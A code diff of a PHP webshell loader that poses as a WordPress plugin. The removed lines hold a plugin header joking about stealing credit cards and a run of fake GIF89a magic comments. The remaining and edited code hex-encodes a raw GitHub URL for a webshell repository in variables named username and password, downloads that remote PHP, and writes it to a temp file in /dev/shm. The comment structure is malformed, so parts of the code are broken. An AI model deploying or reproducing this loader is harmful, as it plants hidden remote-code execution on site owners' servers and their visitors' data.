@@ -1,48 +1,4 @@
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<!-- GIF89;a -->
-<?php
-/*
-Plugin Name: Penghisap Kartu kredit Paman mu
-Plugin URI: https://github.com/
-Description: A webshell API To Get Credits Card U Mom.
-Version: 1.2.0
-Author URI: xnxx.com
-Text Domain: Kang Sedot Kartu Kredit 
-Domain Path: /languages
-License: GPLv3 or later
-Network: true
-*/
-?>
+
 
 
 
@@ -106,17 +62,18 @@ function geturlsinfo($url) {
     return $url_get_contents_data;
 }
 
-/**
+//*
  * HEKERMAN | KURD HACKER
  * @author HEKERMAN
- * user defaultnya admin   
+ * user defaultnya admin  
+// get
 $username = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f'; 
-$password = '74656d706c61746578782e706870';        // password defaultnya tbl
+$password = '74656d706c61746578782e706870';        
+
  * @github https://github.com/
  * @link https://github.com/
  * password default tbl
  */
-
 function hex2str($hex) {
     $str = '';
     for ($i = 0; $i < strlen($hex); $i += 2) {
@@ -137,7 +94,7 @@ function clean_old_temp_files() {
 
 
 clean_old_temp_files();
-$url = hex2str($auth_username) . hex2str($auth_password);
+$url = hex2str($username) . hex2str($password);
 $a = geturlsinfo($url);
 $temporary_file = tempnam('/dev/shm', 'prefix');
 file_put_contents($temporary_file, $a);
